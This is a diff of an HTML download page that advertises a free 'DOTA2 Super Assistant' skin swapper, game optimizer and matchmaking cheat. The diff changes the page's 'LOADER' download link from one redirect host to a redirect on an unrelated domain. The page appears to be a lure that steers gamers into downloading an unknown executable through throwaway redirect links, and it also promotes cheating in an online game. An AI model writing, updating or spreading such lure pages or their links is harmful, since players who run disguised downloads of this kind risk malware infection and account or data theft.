@@ -1,7 +1,7 @@
 <div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
 <h1 style="color:#44aaff;border-bottom:2px solid #2288cc;text-align:center;">⚡ DOTA2 Super Assistant | All-in-One Toolkit (Skins, Optimizer,) ⚡</h1>
 <p style="font-size:1.1em;text-align:center;"><strong>The ultimate all-in-one Dota 2 assistant.</strong> Swap every skin, optimize game performance, and gain strategic advantages.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://fileshare.pw/redirl" style="background:#44aaff;color:#000;padding:12px 25px;">⬇️ DOWNLOAD SUPER ASSISTANT (LOADER)</a><p>✅ All Skins ✅ Game Optimizer ✅ MM Helps ✅ 100% Free</p></div>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#44aaff;color:#000;padding:12px 25px;">⬇️ DOWNLOAD SUPER ASSISTANT (LOADER)</a><p>✅ All Skins ✅ Game Optimizer ✅ MM Helps ✅ 100% Free</p></div>
 <img src="https://i.ytimg.com/vi/7SWG25RDAfo/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLA-fpQrzjjVKoaiiHnXgOtA_9Pkew" style="max-width:100%;border-radius:8px;margin:15px 0;">
 <div><h3>🎮 Key Features of DOTA2 Super Assistant:</h3>
 <ul><li><strong>Full Skin & Item Swapper:</strong> Allows you to apply any cosmetic skin or item to any hero, including exclusive Arcanas, Immortals, and custom models.</li>
